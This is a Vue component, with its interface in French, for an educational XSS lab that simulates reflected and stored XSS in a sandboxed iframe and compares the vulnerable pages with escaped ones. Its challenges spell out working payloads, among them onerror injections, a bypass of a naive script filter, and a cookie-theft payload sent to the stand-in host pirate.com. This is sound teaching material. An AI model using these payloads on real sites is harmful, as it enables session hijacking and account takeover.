<template>
  <LabFrame class="xlab" @reset="recommencer">
    <!-- ============================================ DÉMO RÉFLÉCHIE (exercice 1) -->
    <template v-if="type === 'reflechie'">
      <p class="intro">
        Un mini-site qui affiche une image dont l'adresse vient d'un champ. Derrière, il colle votre
        saisie dans une balise <code>&lt;img src="…"&gt;</code>, sans la filtrer.
      </p>
      <LabModes v-model="mode" :options="MODES_CORRIGE" />
      <div class="form">
        <label class="grow">Adresse de l'image
          <input v-model="valeur" spellcheck="false" placeholder="https://exemple.fr/chat.png" />
        </label>
        <button @click="render()">Afficher l'image</button>
      </div>
      <div class="exemples" v-if="mode === 'vulnerable'">
        Essayez une injection :
        <button class="link" @click="valeur = 'x&quot; onerror=&quot;alert(\'XSS\')'; render()">
          <code>x" onerror="alert('XSS')</code>
        </button>
      </div>
    </template>

    <!-- ============================================ PARAMÈTRE D'URL (exercice 2) -->
    <template v-else-if="type === 'bonjour'">
      <p class="intro">
        La page <code>page.php</code> affiche le prénom reçu dans l'URL :
        <code>echo "&lt;h2&gt;Bonjour {$_GET['name']}&lt;/h2&gt;";</code>
      </p>
      <LabModes v-model="mode" :options="MODES_CORRIGE" />
      <div class="form">
        <label class="grow">Adresse demandée au serveur
          <span class="url">
            <span class="url-fixe">page.php?name=</span>
            <input v-model="valeur" spellcheck="false" placeholder="John" @keydown.enter="render()" />
          </span>
        </label>
        <button @click="render()">Charger la page</button>
      </div>
      <div class="exemples" v-if="mode === 'vulnerable'">
        Essayez :
        <button class="link" @click="valeur = 'John'; render()"><code>John</code></button>
        puis
        <button class="link" @click="valeur = '&lt;script&gt;alert(\'XSS\')&lt;\/script&gt;'; render()">
          <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
        </button>
      </div>
      <p class="hint" v-if="lienPiege">
        Le lien piégé que l'attaquant enverrait à sa victime :
        <code class="lien">{{ lienPiege }}</code>
      </p>
    </template>

    <!-- ============================================ FORMULAIRE (exercice 3) -->
    <template v-else-if="type === 'formulaire'">
      <p class="intro">
        Le formulaire renvoie le nom et l'email saisis dans
        <code>&lt;h2&gt;Bonjour $name&lt;/h2&gt;</code> et <code>&lt;p&gt;Votre email est $email&lt;/p&gt;</code>.
        Comparez ce que produisent les deux fonctions de protection.
      </p>
      <LabModes v-model="mode" :options="MODES_FORMULAIRE" />
      <div class="form">
        <label class="grow">Nom
          <input v-model="valeur" spellcheck="false" placeholder="Jean" />
        </label>
        <label class="grow">Email
          <input v-model="email" spellcheck="false" placeholder="jean@exemple.fr" />
        </label>
        <button @click="render()">Envoyer</button>
      </div>
      <div class="exemples">
        Essayez :
        <button class="link" @click="valeur = '&lt;b&gt;Jean&lt;/b&gt;'; render()"><code>&lt;b&gt;Jean&lt;/b&gt;</code></button>
        puis
        <button class="link" @click="valeur = '&lt;img src=x onerror=alert(\'XSS\')&gt;'; render()">
          <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
        </button>
      </div>
      <p class="hint">
        Le champ email est un <code>type="email"</code> : le navigateur vérifie le format, mais un
        attaquant envoie la requête sans passer par votre formulaire. Seul le serveur protège.
      </p>
    </template>

    <!-- ============================================ DÉMO STOCKÉE (exercice 4 : livre d'or + vol de session) -->
    <template v-else-if="type === 'livre'">
      <p class="intro">
        Un livre d'or : chaque message est <strong>enregistré</strong>, puis réaffiché à
        <strong>tous</strong> les visiteurs. Postez un message, puis rechargez la page « dans le
        navigateur de Bob » pour voir ce que <em>lui</em> reçoit.
      </p>
      <LabModes v-model="mode" :options="MODES_LIVRE" />
      <div class="form">
        <label class="grow">Votre message
          <input v-model="message" spellcheck="false" placeholder="Bravo pour votre site !" />
        </label>
        <button @click="poster">Publier</button>
        <button class="secondary" @click="voirCommeBob">Recharger dans le navigateur de Bob</button>
      </div>
      <p class="hint" v-if="commentaires.length">
        {{ commentaires.length }} message{{ commentaires.length > 1 ? 's' : '' }} enregistré{{ commentaires.length > 1 ? 's' : '' }}.
        La vue ci-dessous est celle de <strong>{{ vueBob ? 'Bob (connecté, cookie de session actif)' : 'vous' }}</strong>.
      </p>
    </template>

    <!-- ============================================ ÉPREUVES -->
    <LabDefis v-else-if="type === 'defis'" v-model="defiId" :defis="DEFIS" :resolus="resolus" v-slot="{ defi: d }">
      <LabModes v-model="mode" :options="MODES_DEFIS" />
      <div class="form">
        <label class="grow">{{ d.champ }}
          <input v-model="saisies[defiId]" spellcheck="false" :placeholder="d.placeholder" />
        </label>
        <button @click="jouerDefi">{{ d.bouton || 'Envoyer' }}</button>
        <button v-if="d.commentaires" class="secondary" @click="voirCommeBob">Ouvrir chez Bob</button>
        <button class="secondary" @click="montrerIndice">Coup de pouce</button>
      </div>
    </LabDefis>

    <!-- ============================================ affichage commun -->
    <LabCode label="HTML réellement produit par le serveur :" :code="source" />

    <div class="ecran">
      <div class="ecran-barre">🌐 navigateur {{ vueBob ? '— session : Bob' : '' }}</div>
      <!-- Recréée à chaque rendu (clé) et forcée en thème clair : en thème sombre, Chrome
           ne repeignait parfois pas le contenu d'une iframe srcdoc mise à jour. -->
      <iframe :key="rendu" sandbox="allow-scripts" :srcdoc="doc"></iframe>
    </div>

    <div v-if="pirate.length" class="pirate">
      <strong>🕵️ Serveur de l'attaquant (pirate.com) — requêtes reçues :</strong>
      <pre v-for="(p, i) in pirate" :key="i">{{ p }}</pre>
    </div>

    <LabVerdict :verdict="verdict" />
  </LabFrame>
</template>

<script setup>
import { ref, reactive, computed, watch, onMounted, onBeforeUnmount } from 'vue'
import LabFrame from './lab/LabFrame.vue'
import LabModes from './lab/LabModes.vue'
import LabCode from './lab/LabCode.vue'
import LabVerdict from './lab/LabVerdict.vue'
import LabDefis from './lab/LabDefis.vue'
import { useProgression } from './lab/useProgression.js'

// reflechie (ex. 1), bonjour (ex. 2), formulaire (ex. 3), livre (ex. 4), defis (À vous d'attaquer)
const props = defineProps({ type: { type: String, default: 'reflechie' } })
const COOKIE_BOB = 'session=BOB-9f3a7c21e0; theme=sombre'

const MODES_CORRIGE = [
  { value: 'vulnerable', label: 'Version vulnérable (saisie collée telle quelle)' },
  { value: 'corrige', label: 'Version corrigée (htmlspecialchars)' },
]
const MODES_FORMULAIRE = [
  { value: 'vulnerable', label: 'Sans protection' },
  { value: 'corrige', label: 'htmlspecialchars (neutralise)' },
  { value: 'strip', label: 'strip_tags (supprime les balises)' },
]
const MODES_LIVRE = [
  { value: 'vulnerable', label: 'Version vulnérable' },
  { value: 'corrige', label: 'Version corrigée (htmlspecialchars)' },
]
const MODES_DEFIS = [
  { value: 'vulnerable', label: 'Page vulnérable' },
  { value: 'corrige', label: 'La même, affichage échappé' },
]

const DEFIS = [
  {
    id: 'reflechie',
    titre: 'XSS réfléchie',
    scenario: "Un champ « adresse de l'image » recopiée dans une balise <img src=\"…\">.",
    objectif: "Faites s'exécuter du JavaScript (déclenchez une alerte).",
    champ: "Adresse de l'image",
    placeholder: 'x" onerror="alert(1)',
    bouton: "Afficher l'image",
    kind: 'img',
    indice: "Le serveur écrit <img src=\"VOTRE_SAISIE\">. Fermez l'attribut avec un guillemet, puis ajoutez un gestionnaire : x\" onerror=\"alert(1)",
  },
  {
    id: 'filtre',
    titre: 'Contourner un filtre naïf',
    scenario: "Ce livre d'or retire les balises <script> avant d'afficher. Beaucoup de développeurs croient être protégés ainsi.",
    objectif: "Exécutez du JavaScript malgré le filtre anti-<script>.",
    champ: 'Votre message',
    placeholder: "<img src=x onerror=alert(1)>",
    kind: 'strip',
    indice: "Le filtre ne retire QUE les balises <script>. Une balise <img> avec onerror n'est pas filtrée : <img src=x onerror=alert(1)>",
  },
  {
    id: 'stockee',
    titre: 'XSS stockée',
    scenario: "Un livre d'or classique. Votre message est enregistré et réaffiché à chaque visiteur.",
    objectif: "Publiez un message qui s'exécute chez un AUTRE visiteur (Bob). Publiez, puis « Ouvrir chez Bob ».",
    champ: 'Votre message',
    placeholder: "<script>alert('stockée')<\/script>",
    bouton: 'Publier',
    kind: 'store',
    commentaires: true,
    indice: "Ici rien n'est filtré : un <script>alert(1)<\/script> suffit. Publiez-le, puis cliquez « Ouvrir chez Bob » : il s'exécute dans SON navigateur, pas seulement le vôtre.",
  },
  {
    id: 'cookie',
    titre: 'Vol de session',
    scenario: "Même livre d'or, mais Bob est connecté : son navigateur détient un cookie de session. L'attaquant veut ce cookie.",
    objectif: "Publiez un message qui envoie le cookie de Bob vers pirate.com. Publiez, puis « Ouvrir chez Bob ».",
    champ: 'Votre message',
    placeholder: '<img src=x onerror="new Image().src=\'https://pirate.com/?c=\'+document.cookie">',
    bouton: 'Publier',
    kind: 'store',
    commentaires: true,
    cookie: true,
    indice: "document.cookie contient la session. Exfiltrez-le en le collant dans l'URL d'une image vers le serveur pirate : <img src=x onerror=\"new Image().src='https://pirate.com/?c='+document.cookie\">",
  },
]

const mode = ref('vulnerable')
const valeur = ref('')
const email = ref('')
const message = ref('')
const defiId = ref(DEFIS[0].id)
const saisies = reactive({})
const commentaires = ref([])
const vueBob = ref(false)
const doc = ref('')
const rendu = ref(0)
const source = ref('')
const verdict = ref(null)
const pirate = ref([])
const { resolus, charger, marquer, effacer } = useProgression('xss-lab:defis')

const defi = computed(() => DEFIS.find((d) => d.id === defiId.value))

// Exercice 2 : l'URL qu'un attaquant ferait cliquer (saisie encodée comme dans un vrai lien).
const lienPiege = computed(() =>
  mode.value === 'vulnerable' && /[<>"]/.test(valeur.value)
    ? 'https://site.fr/page.php?name=' + encodeURIComponent(valeur.value)
    : '',
)

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;')
}

// Comme strip_tags en PHP : retire tout ce qui ressemble à une balise, garde le texte.
function stripTags(s) {
  return String(s).replace(/<[^>]*>?/g, '')
}

// Ce que le « serveur » fait de la saisie avant de l'afficher, selon le mode choisi.
function proteger(v) {
  if (mode.value === 'corrige') return escapeHtml(v)
  if (mode.value === 'strip') return stripTags(v)
  return v
}

// Petit "serveur" injecté dans l'iframe : simule alert() et le cookie, intercepte les exfiltrations.
function harness(cookie) {
  return `<script>(function(){
    window.__c=${JSON.stringify(cookie || '')};
    try{Object.defineProperty(document,'cookie',{get:function(){return window.__c},set:function(v){window.__c=v},configurable:true})}catch(e){}
    function hit(k,d){parent.postMessage({__xss:1,kind:k,data:String(d==null?'':d)},'*')}
    ['alert','confirm','prompt'].forEach(function(f){window[f]=function(m){hit('js',m);return true}});
    var I=window.Image;window.Image=function(){var o={};Object.defineProperty(o,'src',{set:function(v){hit('exfil',v)},get:function(){return''}});return o};
    window.fetch=function(u){hit('exfil',u);return Promise.resolve({})};
    if(navigator.sendBeacon)navigator.sendBeacon=function(u,d){hit('exfil',u+' '+(d==null?'':d));return true};
    window.onerror=function(){return true};
  })()<\/script>`
}

// La page simulée reste en thème clair, même quand le site est en sombre (sinon texte sombre sur fond sombre).
const PAGE_CSS = `<style>:root{color-scheme:light}body{font-family:system-ui,sans-serif;margin:0;padding:12px;color:#1b1b1f;background:#fff}
h2{margin:0 0 8px;font-size:18px}h3{margin:0 0 8px;font-size:15px}p{margin:0}ul{padding-left:0;list-style:none;margin:0}
li,.c{background:#f5f5f7;border-radius:6px;padding:8px 10px;margin:6px 0}img{max-width:120px;height:auto}</style>`

// Construit le HTML de la page (le corps est ce que le serveur renvoie, cf. source).
function corps(kind, payload, comments) {
  if (kind === 'img') return `<img src="${proteger(payload)}">`
  if (kind === 'bonjour') return `<h2>Bonjour ${proteger(payload)}</h2>`
  if (kind === 'formulaire') return `<h2>Bonjour ${proteger(payload)}</h2>\n<p>Votre email est ${proteger(email.value)}</p>`
  if (kind === 'strip') {
    // Filtre naïf de l'épreuve 2 : ne retire que les balises de type script.
    const v = mode.value === 'corrige' ? escapeHtml(payload) : payload.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '')
    return `<div class="c">${v}</div>`
  }
  // store : livre d'or, tous les messages enregistrés
  const items = (comments || []).map((m) => `<div class="c">${proteger(m)}</div>`).join('')
  return `<h3>Livre d'or</h3>${items || '<p style="color:#888">Aucun message pour l\'instant.</p>'}`
}

function currentKind() {
  if (props.type === 'reflechie') return 'img'
  if (props.type === 'livre') return 'store'
  if (props.type === 'defis') return defi.value.kind
  return props.type
}

function render(asBob = false) {
  vueBob.value = asBob
  pirate.value = []
  verdict.value = null
  const kind = currentKind()
  let payload = ''
  if (props.type === 'defis') payload = kind === 'store' ? '' : saisies[defiId.value] || ''
  else payload = valeur.value
  const body = corps(kind, payload, commentaires.value)
  const titre = kind === 'img' ? "<h3>Aperçu de l'image</h3>" : kind === 'strip' ? '<h3>Message publié</h3>' : ''
  rendu.value++
  doc.value = `<!doctype html><html><head><meta charset="utf-8">${PAGE_CSS}</head><body>${harness(asBob ? COOKIE_BOB : '')}${titre}${body}</body></html>`
  // Montre le HTML produit (utile pédagogiquement), sauf pour le livre d'or
  source.value = kind === 'store' ? '' : body
}

function poster() {
  if (!message.value.trim()) return
  commentaires.value.push(message.value)
  message.value = ''
  render(false)
}

function voirCommeBob() {
  if (props.type === 'defis') {
    const m = saisies[defiId.value]
    if (m && m.trim() && !commentaires.value.includes(m)) commentaires.value.push(m)
  }
  render(true)
}

// Remet l'exercice dans son état de départ : saisies, messages, mode, résultats
// et, pour les épreuves, la progression enregistrée dans le navigateur.
function recommencer() {
  mode.value = 'vulnerable'
  valeur.value = ''
  email.value = ''
  message.value = ''
  commentaires.value = []
  Object.keys(saisies).forEach((k) => delete saisies[k])
  if (props.type === 'defis') {
    defiId.value = DEFIS[0].id
    effacer()
  }
  render(false)
}

function jouerDefi() {
  const d = defi.value
  if (d.kind === 'store') {
    const m = saisies[defiId.value]
    if (m && m.trim() && !commentaires.value.includes(m)) commentaires.value.push(m)
    render(false)
    verdict.value = { ton: 'info', texte: 'Message publié. Cliquez « Ouvrir chez Bob » pour voir ce qu\'il déclenche chez un autre visiteur.' }
  } else {
    render(false)
  }
}

function montrerIndice() {
  verdict.value = { ton: 'info', texte: 'Coup de pouce : ' + defi.value.indice }
}

const SUCCES_DEMO = {
  reflechie: 'Le JavaScript s\'est exécuté : votre saisie est devenue du code. C\'est une XSS réfléchie.',
  bonjour: 'Le script s\'est exécuté : la valeur de name a été collée telle quelle dans le HTML. Il suffit de faire cliquer le lien piégé à une victime.',
  formulaire: 'Le JavaScript s\'est exécuté : le nom saisi est devenu du code. Passez en htmlspecialchars ou strip_tags et renvoyez le même nom.',
}

function onMessage(e) {
  const d = e.data
  if (!d || d.__xss !== 1) return
  if (SUCCES_DEMO[props.type]) {
    if (mode.value === 'vulnerable') verdict.value = { ok: true, texte: SUCCES_DEMO[props.type] }
    return
  }
  if (props.type === 'livre') {
    if (d.kind === 'exfil') {
      pirate.value.push('GET ' + d.data)
      verdict.value = { ok: true, texte: 'Le cookie de session de Bob vient de partir vers pirate.com. Avec lui, l\'attaquant se connecte à sa place, sans mot de passe.' }
    } else if (d.kind === 'js') {
      verdict.value = { ok: true, texte: 'Le code s\'est exécuté dans le navigateur de Bob : un seul message piégé touche tous les visiteurs. C\'est une XSS stockée.' }
    }
    return
  }
  // défis
  const dfi = defi.value
  if (mode.value === 'corrige') return // en mode corrigé, une exécution ne devrait pas arriver
  if (dfi.cookie) {
    if (d.kind === 'exfil' && String(d.data).includes('BOB-9f3a7c21e0')) {
      pirate.value.push('GET ' + d.data)
      verdict.value = { ok: true, texte: 'Réussi ! Le cookie de session de Bob est arrivé sur pirate.com. Vous pourriez maintenant usurper sa session.' }
      marquer(dfi.id)
    } else if (d.kind === 'exfil') {
      pirate.value.push('GET ' + d.data)
      verdict.value = { ton: 'warn', texte: 'Une requête est partie vers le pirate, mais sans le cookie. Ajoutez +document.cookie à l\'URL.' }
    }
    return
  }
  if (d.kind === 'js' || d.kind === 'exfil') {
    const besoinBob = dfi.kind === 'store'
    if (besoinBob && !vueBob.value) {
      verdict.value = { ton: 'warn', texte: 'Le code s\'exécute, mais chez vous. Le but est qu\'il s\'exécute chez un autre visiteur : cliquez « Ouvrir chez Bob ».' }
      return
    }
    verdict.value = { ok: true, texte: 'Réussi ! Votre saisie a été exécutée comme du code par le navigateur.' }
    marquer(dfi.id)
  }
}

watch(mode, () => render(vueBob.value))
watch(defiId, () => { verdict.value = null; pirate.value = []; commentaires.value = []; render(false) })

onMounted(() => {
  charger()
  window.addEventListener('message', onMessage)
  render(false)
})
onBeforeUnmount(() => window.removeEventListener('message', onMessage))
</script>

<style scoped>
.form input { width: 100%; }
.url { display: flex; align-items: stretch; }
.url-fixe {
  padding: 0.35rem 0.5rem; border: 1px solid var(--vp-c-divider); border-right: 0;
  border-radius: 4px 0 0 4px; background: var(--vp-c-bg-alt);
  font-family: var(--vp-font-family-mono); font-size: 0.9em; color: var(--vp-c-text-2); white-space: nowrap;
}
.url input { border-radius: 0 4px 4px 0; }
.lien { word-break: break-all; }
.ecran { margin-top: 0.6rem; border: 1px solid var(--vp-c-divider); border-radius: 6px; overflow: hidden; }
.ecran-barre { background: var(--vp-c-bg); padding: 0.3rem 0.6rem; font-size: 0.8em; color: var(--vp-c-text-2); border-bottom: 1px solid var(--vp-c-divider); }
.ecran iframe { width: 100%; height: 12rem; border: 0; background: #fff; display: block; color-scheme: light; }
.pirate {
  margin-top: 0.6rem; padding: 0.7rem 0.9rem; border-radius: 6px;
  border-left: 4px solid var(--vp-c-danger-1); background: var(--vp-c-danger-soft); font-size: 0.85em;
}
.pirate pre { margin: 0.3rem 0 0; white-space: pre-wrap; word-break: break-all; }
</style>
